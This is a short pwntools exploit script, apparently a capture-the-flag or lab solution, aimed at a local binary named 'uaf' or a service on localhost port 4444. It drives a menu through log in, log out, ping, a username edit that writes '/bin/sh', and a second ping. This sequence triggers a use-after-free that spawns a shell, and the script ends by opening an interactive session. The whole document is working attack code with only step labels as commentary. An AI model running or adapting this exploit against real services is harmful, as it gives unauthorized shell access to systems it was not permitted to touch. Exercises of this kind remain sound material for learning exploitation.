from pwn import *

local = False
if local:
    r = process("./uaf")
    context.terminal = [ "tmux", "splitw" ]
    gdb.attach(r, """
        c
    """)
else:
    r = remote("localhost", 4444)

# log in
r.recvuntil("> ")
r.sendline("2")
r.recvuntil("Username: ")
r.sendline("test")

# log out
r.recvuntil("> ")
r.sendline("2")

# ping
r.recvuntil("> ")
r.sendline("1")

# edit username
r.recvuntil("> ")
r.sendline("3")
r.recvuntil("Username: ")
r.sendline("/bin/sh")

# ping
r.recvuntil("> ")
r.sendline("1")

r.interactive()
